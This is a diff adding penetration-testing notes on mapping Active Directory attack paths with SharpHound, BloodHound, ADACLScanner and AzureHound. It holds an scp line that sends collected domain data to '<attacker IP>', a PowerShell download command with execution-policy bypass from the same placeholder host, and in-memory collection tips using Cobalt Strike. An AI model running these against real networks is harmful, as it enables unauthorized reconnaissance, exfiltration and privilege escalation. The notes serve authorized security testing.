@@ -1,0 +1,117 @@
+Active Directory BloodHound
+
+
+# Overview
+
+Collect Active Directory relationship data with SharpHound and analyze attack paths in BloodHound. Includes ACL scanning and Azure AD collection.
+
+
+# Related Notes
+
+active-directory.txt     Domain recon and on-domain enumeration
+ad-attacks.txt           Exploiting paths found in BloodHound
+ldap-owa.txt             LDAP enumeration from Linux
+
+
+# SharpHound Collection
+
+## Overview
+
+SharpHound uses LDAP and native Win32 APIs to map users, groups, sessions, ACLs, and trusts into JSON for BloodHound.
+
+Default collection from domain-joined host gathers group memberships, trusts, abusable ACLs, GPO links, OUs, and local admin/session data from reachable computers. Session enumeration can take 10–15 minutes on busy networks.
+
+## Commands
+
+From domain-joined PowerShell:
+    Import-Module .\SharpHound.ps1
+    Invoke-BloodHound -CollectionMethod All
+    Invoke-BloodHound -CollectionMethod ACL,Session,Trusts
+
+Collectors:
+    https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
+
+Upload zip to analyst machine (example):
+    Compress-Archive -Path .\<timestamp>_BloodHound.zip -DestinationPath .\sharp.zip
+    scp sharp.zip kali@<attacker IP>:/tmp/
+
+## OpSec
+
+Prefer in-memory collection on authorized assessments:
+    Cobalt Strike execute-assembly with SharpHound.exe
+    Invoke-BloodHound from a writable user directory, not a world-readable share
+
+## Validation / False Positives
+
+BloodHound shows graph reachability — confirm each edge with manual abuse steps in ad-attacks.txt.
+Missing session data produces incomplete paths — rerun with Session collection when safe.
+
+
+# BloodHound Analysis
+
+## Overview
+
+BloodHound Community Edition (CE) is the current project. Legacy BloodHound used Neo4j — still seen in older lab environments.
+
+## Commands
+
+BloodHound CE (current):
+    https://github.com/SpecterOps/BloodHound
+    Install per release notes (Linux AppImage or package)
+    Import the SharpHound zip via the UI
+
+Legacy BloodHound + Neo4j:
+    neo4j console
+    Open http://localhost:7474
+    Login neo4j:neo4j, set new password
+    bloodhound
+    Login neo4j:<new password>
+    Drag and drop SharpHound zip into the GUI
+
+Reset Neo4j password:
+    /usr/share/neo4j/bin/neo4j-admin set-initial-password neo4j
+
+Useful queries:
+    Shortest path to Domain Admins from owned principals
+    All Kerberoastable users with path to DA
+    AS-REP roastable users
+
+## Validation / False Positives
+
+A path through many hops may be theoretical — validate ownership of each node in the path.
+Pre-built queries highlight candidates; exploitation still requires credentials or ACL rights.
+
+
+# ADACLScanner
+
+## Commands
+
+cd C:\Users\<user>\Desktop
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://<attacker IP>:8000/ADACLScan.ps1', 'ADACLScan.ps1')"
+
+.\ADACLScan.ps1 -Base "OU=CORP,DC=ACME,DC=ORG"
+.\ADACLScan.ps1 -Base "OU=CORP,DC=ACME,DC=ORG" -HTML
+
+Output: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
+
+## Validation / False Positives
+
+GenericAll, WriteDacl, and ForceChangePassword in CSV need manual confirmation — see ad-attacks.txt.
+
+
+# AzureHound
+
+## Overview
+
+Collect Azure AD / Entra ID data for BloodHound analysis of hybrid environments.
+
+## Commands
+
+https://github.com/BloodHoundAD/AzureHound/releases
+
+Run with appropriate Azure credentials per tool documentation.
+Import output into BloodHound CE alongside on-prem SharpHound data.
+
+## Validation / False Positives
+
+Cloud edges depend on sync and app permissions — correlate with portal configuration before reporting.
